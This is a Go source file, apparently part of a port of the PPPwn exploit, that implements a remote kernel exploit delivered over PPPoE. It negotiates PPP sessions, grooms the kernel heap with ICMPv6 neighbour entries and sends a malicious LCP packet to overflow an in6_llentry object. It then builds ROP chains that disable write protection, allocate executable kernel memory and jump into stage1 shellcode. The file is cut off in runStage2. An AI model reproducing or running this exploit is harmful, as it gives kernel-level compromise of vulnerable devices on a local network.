package exploit

import (
	"bytes"
	"encoding/binary"
	"fmt"
	"log"
	"net"
	"os"
	"time"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	lcp2 "github.com/wetor/PPPwn_go/internal/lcp"
	"github.com/wetor/PPPwn_go/internal/packet"
	pppoe2 "github.com/wetor/PPPwn_go/internal/pppoe"
	"github.com/wetor/PPPwn_go/internal/utils"
)

const (
	SPRAY_NUM   = 0x1000
	PIN_NUM     = 0x1000
	CORRUPT_NUM = 0x1

	HOLE_START = 0x400
	HOLE_SPACE = 0x10

	LCP_ID  = 0x41
	IPCP_ID = 0x41

	SESSION_ID = 0xffff

	STAGE2_PORT = 9020

	//SOURCE_MAC = "07:c2:a8:2c:b3:9f"
	SOURCE_MAC  = "41:41:41:41:41:41"
	SOURCE_IPV4 = "41.41.41.41"
	SOURCE_IPV6 = "fe80::4141:4141:4141:4141"

	TARGET_IPV4 = "42.42.42.42"

	BPF_FILTER = "(ip6) || (pppoed) || (pppoes && !ip)"
)

type Exploit struct {
	offs   Offset
	iface  string
	stage1 []byte
	stage2 []byte

	p *packet.Packet

	kaslr_offset uint64
	pppoe_softc  uint64

	pppoe_softc_list uint64

	target_mac net.HardwareAddr
	source_mac net.HardwareAddr

	target_ipv6 net.IP
}

func NewExploit(offs Offset, iface string, stage1, stage2 []byte) *Exploit {
	e := &Exploit{
		offs:   offs,
		iface:  iface,
		stage1: stage1,
		stage2: stage2,
	}

	e.p = packet.NewPacket(e.iface, BPF_FILTER)
	return e
}

func (e *Exploit) kdlsym(addr uint64) uint64 {
	return e.kaslr_offset + addr
}

func (e *Exploit) lcp_negotiation() {
	var err error

	fmt.Println("[*] Sending LCP configure request...")
	err = e.p.SendLCP(&packet.SendLCPParams{
		SrcMAC:       e.source_mac,
		DstMAC:       e.target_mac,
		EthernetType: layers.EthernetTypePPPoESession,
		SessionID:    SESSION_ID,
		LCP: &lcp2.Pkt{
			Proto: lcp2.ProtoLCP,
			Code:  lcp2.CodeConfigureRequest,
			ID:    LCP_ID,
		},
	})
	if err != nil {
		log.Fatal(err)
	}

	fmt.Println("[*] Waiting for LCP configure ACK...")
	e.p.ReceiveLCP(lcp2.ProtoLCP, lcp2.CodeConfigureAck)

	fmt.Println("[*] Waiting for LCP configure request...")
	_, pkt := e.p.ReceiveLCP(lcp2.ProtoLCP, lcp2.CodeConfigureRequest)

	fmt.Println("[*] Sending LCP configure ACK...")
	err = e.p.SendLCP(&packet.SendLCPParams{
		SrcMAC:       e.source_mac,
		DstMAC:       e.target_mac,
		EthernetType: layers.EthernetTypePPPoESession,
		SessionID:    SESSION_ID,
		LCP: &lcp2.Pkt{
			Proto: lcp2.ProtoLCP,
			Code:  lcp2.CodeConfigureAck,
			ID:    pkt.ID,
		},
	})
	if err != nil {
		log.Fatal(err)
	}
}

func (e *Exploit) ipcp_negotiation() {
	var err error
	fmt.Println("[*] Sending IPCP configure request...")
	err = e.p.SendLCP(&packet.SendLCPParams{
		SrcMAC:       e.source_mac,
		DstMAC:       e.target_mac,
		EthernetType: layers.EthernetTypePPPoESession,
		SessionID:    SESSION_ID,
		LCP: &lcp2.Pkt{
			Proto: lcp2.ProtoIPCP,
			Code:  lcp2.CodeConfigureRequest,
			ID:    IPCP_ID,
			Options: []lcp2.Option{
				&lcp2.IPv4AddrOption{
					AddrType: lcp2.OpIPAddress,
					Addr:     net.ParseIP(SOURCE_IPV4),
				},
			},
		},
	})
	if err != nil {
		log.Fatal(err)
	}

	fmt.Println("[*] Waiting for IPCP configure ACK...")
	e.p.ReceiveLCP(lcp2.ProtoIPCP, lcp2.CodeConfigureAck)

	fmt.Println("[*] Waiting for IPCP configure request...")
	_, pkt := e.p.ReceiveLCP(lcp2.ProtoIPCP, lcp2.CodeConfigureRequest)

	fmt.Println("[*] Sending IPCP configure NAK...")
	err = e.p.SendLCP(&packet.SendLCPParams{
		SrcMAC:       e.source_mac,
		DstMAC:       e.target_mac,
		EthernetType: layers.EthernetTypePPPoESession,
		SessionID:    SESSION_ID,
		LCP: &lcp2.Pkt{
			Proto: lcp2.ProtoIPCP,
			Code:  lcp2.CodeConfigureNak,
			ID:    pkt.ID,
			Options: []lcp2.Option{
				&lcp2.IPv4AddrOption{
					AddrType: lcp2.OpIPAddress,
					Addr:     net.ParseIP(TARGET_IPV4),
				},
			},
		},
	})
	if err != nil {
		log.Fatal(err)
	}

	fmt.Println("[*] Waiting for IPCP configure request...")
	_, pkt = e.p.ReceiveLCP(lcp2.ProtoIPCP, lcp2.CodeConfigureRequest)

	fmt.Println("[*] Sending IPCP configure ACK...")
	err = e.p.SendLCP(&packet.SendLCPParams{
		SrcMAC:       e.source_mac,
		DstMAC:       e.target_mac,
		EthernetType: layers.EthernetTypePPPoESession,
		SessionID:    SESSION_ID,
		LCP: &lcp2.Pkt{
			Proto:   lcp2.ProtoIPCP,
			Code:    lcp2.CodeConfigureAck,
			ID:      pkt.ID,
			Options: pkt.Options,
		},
	})
	if err != nil {
		log.Fatal(err)
	}
}

func (e *Exploit) ppp_negotation(cb func() []byte, ignore_initial_reqs bool) {
	fmt.Printf("[*] Waiting for PADI...\n")
	eth, pkt := e.p.ReceivePPPoE(layers.EthernetTypePPPoEDiscovery, layers.PPPoECodePADI)
	var host_uniq []byte
	for _, tag := range pkt.Tags {
		if tag.Type() == uint16(pppoe2.TagTypeHostUniq) {
			host_uniq = tag.(*pppoe2.TagByteSlice).Value
			break
		}
	}
	if host_uniq == nil {
		log.Fatal("host_uniq is nil")
	}

	e.pppoe_softc = binary.LittleEndian.Uint64(host_uniq)
	fmt.Printf("[+] pppoe_softc: %x\n", host_uniq)
	e.target_mac = eth.SrcMAC
	fmt.Printf("[+] Target MAC: %v\n", e.target_mac)
	e.source_mac, _ = net.ParseMAC(SOURCE_MAC)
	ac_cookie := []byte{}
	if cb != nil {
		ac_cookie = cb()
	}
	fmt.Printf("[+] AC cookie length: %X\n", len(ac_cookie))
	fmt.Printf("[*] Sending PADO...\n")
	err := e.p.SendPPPoE(&packet.SendPPPoEParams{
		SrcMAC:       e.source_mac,
		DstMAC:       e.target_mac,
		EthernetType: layers.EthernetTypePPPoEDiscovery,
		PPPoE: &pppoe2.Pkt{
			Code: layers.PPPoECodePADO,
			Tags: []pppoe2.Tag{
				&pppoe2.TagByteSlice{
					Value:   ac_cookie,
					TagType: pppoe2.TagTypeACCookie,
				},
				&pppoe2.TagByteSlice{
					Value:   host_uniq,
					TagType: pppoe2.TagTypeHostUniq,
				},
			},
		},
	})
	if err != nil {
		log.Fatal(err)
	}

	fmt.Printf("[*] Waiting for PADR...\n")
	e.p.ReceivePPPoE(layers.EthernetTypePPPoEDiscovery, layers.PPPoECodePADR)

	fmt.Printf("[*] Sending PADS...\n")
	err = e.p.SendPPPoE(&packet.SendPPPoEParams{
		SrcMAC:       e.source_mac,
		DstMAC:       e.target_mac,
		EthernetType: layers.EthernetTypePPPoEDiscovery,
		PPPoE: &pppoe2.Pkt{
			Code:      layers.PPPoECodePADS,
			SessionID: SESSION_ID,
			Tags: []pppoe2.Tag{
				&pppoe2.TagByteSlice{
					Value:   host_uniq,
					TagType: pppoe2.TagTypeHostUniq,
				},
			},
		},
	})
	if err != nil {
		log.Fatal(err)
	}
}

func (e *Exploit) BuildFakeIfnet() []byte {
	// Leak address
	// Upper bytes are encoded with SESSION_ID
	planted := (e.pppoe_softc + 0x07) & 0xffffffffffff
	e.source_mac = utils.ToBytes(planted, 6, binary.LittleEndian)
	fmt.Printf("[+] Source MAC: %s\n", e.source_mac.String())

	var fakeIfnet bytes.Buffer

	fakeIfnet.Write(bytes.Repeat([]byte("A"), 0x48-fakeIfnet.Len()))
	fakeIfnet.Write(utils.P64(0)) // if_addrhead
	fakeIfnet.Write(bytes.Repeat([]byte("A"), 0x70-fakeIfnet.Len()))
	fakeIfnet.Write(utils.P16(0x0001)) // if_index
	fakeIfnet.Write(bytes.Repeat([]byte("A"), 0xa0-fakeIfnet.Len()))
	fakeIfnet.Write(utils.P8(IFT_ETHER)) // ifi_type
	fakeIfnet.Write(utils.P8(0))         // ifi_physical
	fakeIfnet.Write(utils.P8(0x8 + 0x1)) // ifi_addrlen
	fakeIfnet.Write(bytes.Repeat([]byte("A"), 0x1b8-fakeIfnet.Len()))
	fakeIfnet.Write(utils.P64(e.pppoe_softc + PPPOE_SOFTC_SC_DEST)) // if_addr
	fakeIfnet.Write(bytes.Repeat([]byte("A"), 0x428-fakeIfnet.Len()))
	fakeIfnet.Write(utils.P64(e.pppoe_softc + 0x10 - 0x8)) // nd_ifinfo

	// if_afdata_lock
	fakeIfnet.Write(bytes.Repeat([]byte("A"), 0x480-fakeIfnet.Len()))
	fakeIfnet.Write(utils.P64(0))             // lo_name
	fakeIfnet.Write(utils.P32(RW_INIT_FLAGS)) // lo_flags
	fakeIfnet.Write(utils.P32(0))             // lo_data
	fakeIfnet.Write(utils.P64(0))             // lo_witness
	fakeIfnet.Write(utils.P64(RW_UNLOCKED))   // rw_lock

	// if_addr_mtx
	fakeIfnet.Write(bytes.Repeat([]byte("A"), 0x4c0-fakeIfnet.Len()))
	fakeIfnet.Write(utils.P64(0))              // lo_name
	fakeIfnet.Write(utils.P32(MTX_INIT_FLAGS)) // lo_flags
	fakeIfnet.Write(utils.P32(0))              // lo_data
	fakeIfnet.Write(utils.P64(0))              // lo_witness
	fakeIfnet.Write(utils.P64(MTX_UNOWNED))    // mtx_lock

	return fakeIfnet.Bytes()
}

func (e *Exploit) BuildOverflowLle() []byte {
	// Fake in6_llentry
	var overflowLle bytes.Buffer

	// lle_next
	overflowLle.Write(utils.P64(e.pppoe_softc + PPPOE_SOFTC_SC_AC_COOKIE)) // le_next
	overflowLle.Write(utils.P64(0))                                        // le_prev

	// lle_lock
	overflowLle.Write(utils.P64(0))                        // lo_name
	overflowLle.Write(utils.P32(RW_INIT_FLAGS | LO_DUPOK)) // lo_flags
	overflowLle.Write(utils.P32(0))                        // lo_data
	overflowLle.Write(utils.P64(0))                        // lo_witness
	overflowLle.Write(utils.P64(RW_UNLOCKED))              // rw_lock

	overflowLle.Write(utils.P64(e.pppoe_softc + PPPOE_SOFTC_SC_AC_COOKIE - LLTABLE_LLTIFP)) // lle_tbl
	overflowLle.Write(utils.P64(0))                                                         // lle_head
	overflowLle.Write(utils.P64(0))                                                         // lle_free
	overflowLle.Write(utils.P64(0))                                                         // la_hold
	overflowLle.Write(utils.P32(0))                                                         // la_numheld
	overflowLle.Write(utils.P32(0))                                                         // pad
	overflowLle.Write(utils.P64(0))                                                         // la_expire
	overflowLle.Write(utils.P16(LLE_EXCLUSIVE))                                             // la_flags
	overflowLle.Write(utils.P16(0))                                                         // la_asked
	overflowLle.Write(utils.P16(0))                                                         // la_preempt
	overflowLle.Write(utils.P16(0))                                                         // ln_byhint
	overflowLle.Write(utils.P16(ND6_LLINFO_NOSTATE))                                        // ln_state
	overflowLle.Write(utils.P16(0))                                                         // ln_router
	overflowLle.Write(utils.P32(0))                                                         // pad
	overflowLle.Write(utils.P64(0x7fffffffffffffff))                                        // ln_ntick

	return overflowLle.Bytes()
}

func (e *Exploit) BuildFakeLle() []byte {
	// First gadget - must be a valid MAC address
	// Upper bytes are encoded with SESSION_ID
	planted := e.kdlsym(e.offs.FIRST_GADGET) & 0xffffffffffff
	e.source_mac = utils.ToBytes(planted, 6, binary.LittleEndian)
	fmt.Printf("[+] Source MAC: %s\n", e.source_mac.String())
	// Fake in6_llentry
	var fakeLle bytes.Buffer

	// lle_next
	// Third gadget
	fakeLle.Write(utils.P64(e.kdlsym(e.offs.POP_RBX_POP_R14_POP_RBP_JMP_QWORD_PTR_RSI_10))) // le_next
	fakeLle.Write(utils.P64(NULL))                                                          // le_prev

	// lle_lock
	// Fourth gadget
	fakeLle.Write(utils.P64(e.kdlsym(e.offs.LEA_RSP_RSI_20_REPZ_RET))) // lo_name
	fakeLle.Write(utils.P32(RW_INIT_FLAGS | LO_DUPOK))                 // lo_flags
	fakeLle.Write(utils.P32(0))                                        // lo_data
	// Fifth gadget
	fakeLle.Write(utils.P64(e.kdlsym(e.offs.ADD_RSP_B0_POP_RBP_RET))) // lo_witness
	fakeLle.Write(utils.P64(RW_UNLOCKED))                             // rw_lock

	fakeLle.Write(utils.P64(e.pppoe_softc + PPPOE_SOFTC_SC_DEST - LLTABLE_LLTFREE)) // lle_tbl
	fakeLle.Write(utils.P64(NULL))                                                  // lle_head
	fakeLle.Write(utils.P64(NULL))                                                  // lle_free
	fakeLle.Write(utils.P64(NULL))                                                  // la_hold
	fakeLle.Write(utils.P32(0))                                                     // la_numheld
	fakeLle.Write(utils.P32(0))                                                     // pad
	fakeLle.Write(utils.P64(0))                                                     // la_expire
	fakeLle.Write(utils.P16(LLE_STATIC | LLE_EXCLUSIVE))                            // la_flags
	fakeLle.Write(utils.P16(0))                                                     // la_asked
	fakeLle.Write(utils.P16(0))                                                     // la_preempt
	fakeLle.Write(utils.P16(0))                                                     // ln_byhint
	fakeLle.Write(utils.P16(ND6_LLINFO_NOSTATE))                                    // ln_state
	fakeLle.Write(utils.P16(0))                                                     // ln_router
	fakeLle.Write(utils.P32(0))                                                     // pad
	fakeLle.Write(utils.P64(0x7fffffffffffffff))                                    // ln_ntick
	fakeLle.Write(utils.P32(0))                                                     // lle_refcnt
	fakeLle.Write(utils.P32(0))                                                     // pad
	fakeLle.Write(utils.P64be(0x414141414141))                                      // ll_addr

	// lle_timer
	fakeLle.Write(utils.P64(0))                      // sle
	fakeLle.Write(utils.P64(0))                      // tqe
	fakeLle.Write(utils.P32(0))                      // c_time
	fakeLle.Write(utils.P32(0))                      // pad
	fakeLle.Write(utils.P64(NULL))                   // c_arg
	fakeLle.Write(utils.P64(NULL))                   // c_func
	fakeLle.Write(utils.P64(NULL))                   // c_lock
	fakeLle.Write(utils.P32(CALLOUT_RETURNUNLOCKED)) // c_flags
	fakeLle.Write(utils.P32(0))                      // c_cpu

	// l3_addr6
	fakeLle.Write(utils.P8(SOCKADDR_IN6_SIZE)) // sin6_len
	fakeLle.Write(utils.P8(AF_INET6))          // sin6_family
	fakeLle.Write(utils.P16(0))                // sin6_port
	fakeLle.Write(utils.P32(0))                // sin6_flowinfo
	// sin6_addr
	fakeLle.Write(utils.P64be(0xfe80000100000000))
	fakeLle.Write(utils.P64be(0x4141414141414141))
	fakeLle.Write(utils.P32(0)) // sin6_scope_id

	// pad
	fakeLle.Write(utils.P32(0))

	//fakeLle[e.offs.SECOND_GADGET_OFF : e.offs.SECOND_GADGET_OFF+8] = P64(e.kdlsym(e.offs.PUSH_RBP_JMP_QWORD_PTR_RSI))

	// Second gadget
	fakeLleBytes := fakeLle.Bytes()
	var fakeLleResult bytes.Buffer
	fakeLleResult.Write(fakeLleBytes[:e.offs.SECOND_GADGET_OFF])
	fakeLleResult.Write(utils.P64(e.kdlsym(e.offs.PUSH_RBP_JMP_QWORD_PTR_RSI)))
	fakeLleResult.Write(fakeLleBytes[e.offs.SECOND_GADGET_OFF+8:])

	// Second ROP chain
	rop2 := e.buildSecondRop()
	// First ROP chain
	rop := e.buildFirstRop(fakeLleResult.Bytes(), rop2)

	fakeLleResult.Write(rop)
	fakeLleResult.Write(rop2)
	fakeLleResult.Write(e.stage1)
	return fakeLleResult.Bytes()
}

func (e *Exploit) buildFirstRop(fake_lle, rop2 []byte) []byte {
	var rop bytes.Buffer
	// memcpy(RBX - 0x800, rop2, len(rop2 + stage1))

	// RDI = RBX - 0x800
	rop.Write(utils.P64(e.kdlsym(e.offs.POP_R12_RET)))
	rop.Write(utils.P64(e.kdlsym(e.offs.POP_RBP_RET)))
	rop.Write(utils.P64(e.kdlsym(e.offs.MOV_RDI_RBX_CALL_R12)))
	rop.Write(utils.P64(e.kdlsym(e.offs.POP_RCX_RET)))
	a := int64(-0x800)
	rop.Write(utils.P64(uint64(a)))
	rop.Write(utils.P64(e.kdlsym(e.offs.ADD_RDI_RCX_RET)))

	// RSI += len(fake_lle + rop)
	rop.Write(utils.P64(e.kdlsym(e.offs.POP_RDX_RET)))
	ropOffFixup := rop.Len()
	rop.Write(utils.P64(0xDEADBEEF))
	rop.Write(utils.P64(e.kdlsym(e.offs.SUB_RSI_RDX_MOV_RAX_RSI_POP_RBP_RET)))
	rop.Write(utils.P64(0xDEADBEEF))

	// RDX = len(rop2 + stage1)
	rop.Write(utils.P64(e.kdlsym(e.offs.POP_RDX_RET)))
	rop.Write(utils.P64(uint64(len(rop2) + len(e.stage1))))

	// Call memcpy
	rop.Write(utils.P64(e.kdlsym(e.offs.MEMCPY)))

	// Stack pivot
	rop.Write(utils.P64(e.kdlsym(e.offs.POP_RAX_RET)))
	rop.Write(utils.P64(e.kdlsym(e.offs.POP_RBP_RET)))
	rop.Write(utils.P64(e.kdlsym(e.offs.MOV_RSI_RBX_CALL_RAX)))
	rop.Write(utils.P64(e.kdlsym(e.offs.POP_RDX_RET)))
	rop.Write(utils.P64(0x800 + 0x20))
	rop.Write(utils.P64(e.kdlsym(e.offs.SUB_RSI_RDX_MOV_RAX_RSI_POP_RBP_RET)))
	rop.Write(utils.P64(0xDEADBEEF))
	rop.Write(utils.P64(e.kdlsym(e.offs.LEA_RSP_RSI_20_REPZ_RET)))
	// rop[ropOffFixup : ropOffFixup+8] = P64(-len(fakeLle+rop))
	// Fixup offset of rop2
	ropBytes := rop.Bytes()
	var ropResult bytes.Buffer
	ropResult.Write(ropBytes[:ropOffFixup])
	ropResult.Write(utils.P64(uint64(-int64(len(fake_lle) + len(ropBytes)))))
	ropResult.Write(ropBytes[ropOffFixup+8:])
	return ropResult.Bytes()
}

func (e *Exploit) buildSecondRop() []byte {
	var rop bytes.Buffer

	// setidt(IDT_UD, handler, SDT_SYSIGT, SEL_KPL, 0)
	rop.Write(utils.P64(e.kdlsym(e.offs.POP_RDI_RET)))
	rop.Write(utils.P64(IDT_UD))
	rop.Write(utils.P64(e.kdlsym(e.offs.POP_RSI_RET)))
	rop.Write(utils.P64(e.kdlsym(e.offs.ADD_RSP_28_POP_RBP_RET)))
	rop.Write(utils.P64(e.kdlsym(e.offs.POP_RDX_RET)))
	rop.Write(utils.P64(SDT_SYSIGT))
	rop.Write(utils.P64(e.kdlsym(e.offs.POP_RCX_RET)))
	rop.Write(utils.P64(SEL_KPL))
	rop.Write(utils.P64(e.kdlsym(e.offs.POP_R8_POP_RBP_RET)))
	rop.Write(utils.P64(0))
	rop.Write(utils.P64(0xDEADBEEF))
	rop.Write(utils.P64(e.kdlsym(e.offs.SETIDT)))

	// Disable write protection
	rop.Write(utils.P64(e.kdlsym(e.offs.POP_RSI_RET)))
	rop.Write(utils.P64(CR0_ORI & ^CR0_WP))
	rop.Write(utils.P64(e.kdlsym(e.offs.MOV_CR0_RSI_UD2_MOV_EAX_1_RET)))

	// Enable RWX in kmem_alloc
	rop.Write(utils.P64(e.kdlsym(e.offs.POP_RAX_RET)))
	rop.Write(utils.P64(VM_PROT_ALL))
	rop.Write(utils.P64(e.kdlsym(e.offs.POP_RCX_RET)))
	rop.Write(utils.P64(e.kdlsym(e.offs.KMEM_ALLOC_PATCH1)))
	rop.Write(utils.P64(e.kdlsym(e.offs.MOV_BYTE_PTR_RCX_AL_RET)))
	rop.Write(utils.P64(e.kdlsym(e.offs.POP_RCX_RET)))
	rop.Write(utils.P64(e.kdlsym(e.offs.KMEM_ALLOC_PATCH2)))
	rop.Write(utils.P64(e.kdlsym(e.offs.MOV_BYTE_PTR_RCX_AL_RET)))

	// Restore write protection
	rop.Write(utils.P64(e.kdlsym(e.offs.POP_RSI_RET)))
	rop.Write(utils.P64(CR0_ORI))
	rop.Write(utils.P64(e.kdlsym(e.offs.MOV_CR0_RSI_UD2_MOV_EAX_1_RET)))

	// kmem_alloc(*kernel_map, PAGE_SIZE)

	// RDI = *kernel_map
	rop.Write(utils.P64(e.kdlsym(e.offs.POP_RAX_RET)))
	rop.Write(utils.P64(e.kdlsym(e.offs.RET)))
	rop.Write(utils.P64(e.kdlsym(e.offs.POP_RDI_RET)))
	rop.Write(utils.P64(e.kdlsym(e.offs.KERNEL_MAP)))
	rop.Write(utils.P64(e.kdlsym(e.offs.MOV_RDI_QWORD_PTR_RDI_POP_RBP_JMP_RAX)))
	rop.Write(utils.P64(0xDEADBEEF))

	// RSI = PAGE_SIZE
	rop.Write(utils.P64(e.kdlsym(e.offs.POP_RSI_RET)))
	rop.Write(utils.P64(PAGE_SIZE))

	// Call kmem_alloc
	rop.Write(utils.P64(e.kdlsym(e.offs.KMEM_ALLOC)))

	// R14 = RAX
	rop.Write(utils.P64(e.kdlsym(e.offs.POP_R8_POP_RBP_RET)))
	rop.Write(utils.P64(e.kdlsym(e.offs.POP_RBP_RET)))
	rop.Write(utils.P64(0xDEADBEEF))
	rop.Write(utils.P64(e.kdlsym(e.offs.MOV_R14_RAX_CALL_R8)))

	// memcpy(R14, stage1, len(stage1))

	// RDI = R14
	rop.Write(utils.P64(e.kdlsym(e.offs.POP_R12_RET)))
	rop.Write(utils.P64(e.kdlsym(e.offs.POP_RBP_RET)))
	rop.Write(utils.P64(e.kdlsym(e.offs.MOV_RDI_R14_CALL_R12)))

	// RSI = RSP + len(rop) - rop_rsp_pos
	rop.Write(utils.P64(e.kdlsym(e.offs.PUSH_RSP_POP_RSI_RET)))
	ropRspPos := rop.Len()
	rop.Write(utils.P64(e.kdlsym(e.offs.POP_RDX_RET)))
	ropOffFixup := rop.Len()
	rop.Write(utils.P64(0xDEADBEEF))
	rop.Write(utils.P64(e.kdlsym(e.offs.SUB_RSI_RDX_MOV_RAX_RSI_POP_RBP_RET)))
	rop.Write(utils.P64(0xDEADBEEF))

	// RDX = len(stage1)
	rop.Write(utils.P64(e.kdlsym(e.offs.POP_RDX_RET)))
	rop.Write(utils.P64(uint64(len(e.stage1))))

	// Call memcpy
	rop.Write(utils.P64(e.kdlsym(e.offs.MEMCPY)))

	// Jump into stage1
	rop.Write(utils.P64(e.kdlsym(e.offs.JMP_R14)))

	// rop[ropOffFixup : ropOffFixup+8] = P64(-(len(rop) - ropRspPos))
	// Fixup offset of stage1
	ropBytes := rop.Bytes()
	var ropResult bytes.Buffer
	ropResult.Write(ropBytes[:ropOffFixup])
	ropResult.Write(utils.P64(uint64(-int64(len(ropBytes) - ropRspPos))))
	ropResult.Write(ropBytes[ropOffFixup+8:])
	return ropResult.Bytes()
}

func LcpEchoHandler(iface string) {
	var err error
	p := packet.NewPacket(iface, "pppoes && !ip")
	go func() {
		for {
			eth, pppoePkt, _, pkt := p.ReceiveEthPPPoELCP(lcp2.ProtoLCP, lcp2.CodeEchoRequest)
			err = p.SendLCP(&packet.SendLCPParams{
				SrcMAC:       eth.DstMAC,
				DstMAC:       eth.SrcMAC,
				EthernetType: layers.EthernetTypePPPoESession,
				SessionID:    pppoePkt.SessionID,
				LCP: &lcp2.Pkt{
					Proto: lcp2.ProtoLCP,
					Code:  lcp2.CodeEchoReply,
					ID:    pkt.ID,
				},
			})
			if err != nil {
				log.Fatal(err)
			}
		}
	}()
}

func (e *Exploit) runStage0() {
	LcpEchoHandler(e.iface)

	e.ppp_negotation(e.BuildFakeIfnet, false)
	e.lcp_negotiation()
	e.ipcp_negotiation()

	fmt.Println("[*] Waiting for interface to be ready...")
	var pkt *layers.IPv6
	for packet := range e.p.Source.Packets() {
		if ipv6Layer := packet.Layer(layers.LayerTypeIPv6); ipv6Layer != nil {
			pkt = ipv6Layer.(*layers.IPv6)
			if icmpv6RsLayer := packet.Layer(layers.LayerTypeICMPv6RouterSolicitation); icmpv6RsLayer != nil {
				break
			}
		}
	}
	e.target_ipv6 = pkt.SrcIP
	fmt.Printf("[+] Target IPv6: %v\n", e.target_ipv6.String())

	var err error
	for i := 0; i < SPRAY_NUM; i++ {
		if i%0x100 == 0 {
			fmt.Printf("[*] Heap grooming...%d%%\r", int(float32(i)/float32(SPRAY_NUM)*100))
		}

		// send
		source_ipv6 := net.ParseIP(fmt.Sprintf("fe80::%04x:4141:4141:4141", i))
		err = e.p.SendICMPv6(&packet.SendICMPv6Params{
			SrcMAC:       e.source_mac,
			DstMAC:       e.target_mac,
			EthernetType: layers.EthernetTypeIPv6,
			SrcIP:        source_ipv6,
			DstIP:        e.target_ipv6,
			HopLimit:     64,
			ICMPv6Type:   layers.ICMPv6TypeEchoRequest,
			Layers: []gopacket.SerializableLayer{
				&layers.ICMPv6Echo{},
			},
		})
		if err != nil {
			log.Fatal(err)
		}

		// recv
		for packet := range e.p.Source.Packets() {
			if icmpv6NsLayer := packet.Layer(layers.LayerTypeICMPv6NeighborSolicitation); icmpv6NsLayer != nil {
				break
			}
		}

		if i >= HOLE_START && i%HOLE_SPACE == 0 {
			continue
		}

		// send
		err = e.p.SendICMPv6(&packet.SendICMPv6Params{
			SrcMAC:       e.source_mac,
			DstMAC:       e.target_mac,
			EthernetType: layers.EthernetTypeIPv6,
			SrcIP:        source_ipv6,
			DstIP:        e.target_ipv6,
			HopLimit:     255,
			ICMPv6Type:   layers.ICMPv6TypeNeighborAdvertisement,
			Layers: []gopacket.SerializableLayer{
				&layers.ICMPv6NeighborAdvertisement{
					TargetAddress: source_ipv6,
					Flags:         0xE0,
					Options: []layers.ICMPv6Option{
						{
							Type: layers.ICMPv6OptTargetAddress,
							Data: e.source_mac,
						},
					},
				},
			},
		})
		if err != nil {
			log.Fatal(err)
		}
	}
	fmt.Println("[+] Heap grooming...done")
}

func (e *Exploit) runStage1() {
	var err error

	// Send invalid packet to trigger a printf in the kernel. For some
	// reason, this causes scheduling on CPU 0 at some point, which makes
	// the next allocation use the same per-CPU cache.
	for i := 0; i < PIN_NUM; i++ {
		if i%0x100 == 0 {
			fmt.Printf("[*] Pinning to CPU 0...%d%%\r", int(float32(i)/float32(PIN_NUM)*100))
		}
		bytes := make([]byte, 14)
		copy(bytes, e.target_mac)
		copy(bytes[6:], e.source_mac)
		binary.BigEndian.PutUint16(bytes[12:], uint16(layers.EthernetTypePPPoESession))
		err = e.p.Handle.WritePacketData(bytes)
		if err != nil {
			log.Fatal(err)
		}
		time.Sleep(1 * time.Millisecond)
	}

	fmt.Println("[+] Pinning to CPU 0...done")

	// LCP fails sometimes without the wait
	time.Sleep(1 * time.Second)

	// Corrupt in6_llentry object
	overflow_lle := e.BuildOverflowLle()
	fmt.Println("[*] Sending malicious LCP configure request...")
	for i := 0; i < CORRUPT_NUM; i++ {

		buf := bytes.NewBuffer(nil)
		buf.Write(utils.P16be(uint16(TARGET_SIZE - 2)))
		buf.Write(bytes.Repeat([]byte("A"), TARGET_SIZE-4))
		buf.Write(utils.P16be(uint16(len(overflow_lle) + 2)))
		buf.Write(overflow_lle)

		err = e.p.SendLCP(&packet.SendLCPParams{
			SrcMAC:       e.source_mac,
			DstMAC:       e.target_mac,
			EthernetType: layers.EthernetTypePPPoESession,
			SessionID:    SESSION_ID,
			LCP: &lcp2.Pkt{
				Proto:   lcp2.ProtoLCP,
				Code:    lcp2.CodeConfigureRequest,
				ID:      LCP_ID,
				Len:     uint16(TARGET_SIZE + 4),
				Payload: buf.Bytes(),
			},
		})
		if err != nil {
			log.Fatal(err)
		}
	}

	fmt.Println("[*] Waiting for LCP configure reject...")
	// recv
	for packet := range e.p.Source.Packets() {
		if pppLayer := packet.Layer(layers.LayerTypePPP); pppLayer != nil {
			if pppLayer.(*layers.PPP).PPPType == lcp2.ProtoLCP {
				if pppLayer.LayerPayload()[0] == uint8(lcp2.CodeConfigureReject) {
					break
				}
			}
		}
	}
	// Re-negotiate after rejection
	e.lcp_negotiation()
	e.ipcp_negotiation()

	var source_ipv6 net.IP
	corrupted := false
	for i := SPRAY_NUM - 1; i >= 0; i-- {
		if i%0x100 == 0 {
			fmt.Printf("[*] Scanning for corrupted object...%x\r", i)
		}
		if i >= HOLE_START && i%HOLE_SPACE == 0 {
			continue
		}

		// send
		source_ipv6 = net.ParseIP(fmt.Sprintf("fe80::%04x:4141:4141:4141", i))
		err = e.p.SendICMPv6(&packet.SendICMPv6Params{
			SrcMAC:       e.source_mac,
			DstMAC:       e.target_mac,
			EthernetType: layers.EthernetTypeIPv6,
			SrcIP:        source_ipv6,
			DstIP:        e.target_ipv6,
			HopLimit:     64,
			ICMPv6Type:   layers.ICMPv6TypeEchoRequest,
			Layers: []gopacket.SerializableLayer{
				&layers.ICMPv6Echo{},
			},
		})
		if err != nil {
			log.Fatal(err)
		}

		// recv
		for packet := range e.p.Source.Packets() {
			if icmpv6Layer := packet.Layer(layers.LayerTypeICMPv6); icmpv6Layer != nil {
				icmpv6m := icmpv6Layer.(*layers.ICMPv6)
				if icmpv6m.TypeCode.Type() == layers.ICMPv6TypeEchoReply {
					break
				} else if icmpv6m.TypeCode.Type() == layers.ICMPv6TypeNeighborSolicitation {
					corrupted = true
					break
				}
			}
		}
		if corrupted {
			break
		}

		err = e.p.SendICMPv6(&packet.SendICMPv6Params{
			SrcMAC:       e.source_mac,
			DstMAC:       e.target_mac,
			EthernetType: layers.EthernetTypeIPv6,
			SrcIP:        source_ipv6,
			DstIP:        e.target_ipv6,
			HopLimit:     255,
			ICMPv6Type:   layers.ICMPv6TypeNeighborAdvertisement,
			Layers: []gopacket.SerializableLayer{
				&layers.ICMPv6NeighborAdvertisement{
					TargetAddress: source_ipv6,
					Flags:         0xE0,
					Options: []layers.ICMPv6Option{
						{
							Type: layers.ICMPv6OptTargetAddress,
							Data: e.source_mac,
						},
					},
				},
			},
		})
		if err != nil {
			log.Fatal(err)
		}
	}

	if !corrupted {
		fmt.Println("[-] Scanning for corrupted object...failed. Please retry.")
		os.Exit(1)
	}

	fmt.Printf("[+] Scanning for corrupted object...found %v\n", source_ipv6.String())
}

func (e *Exploit) runStage2() {
	var data []byte

	end := false
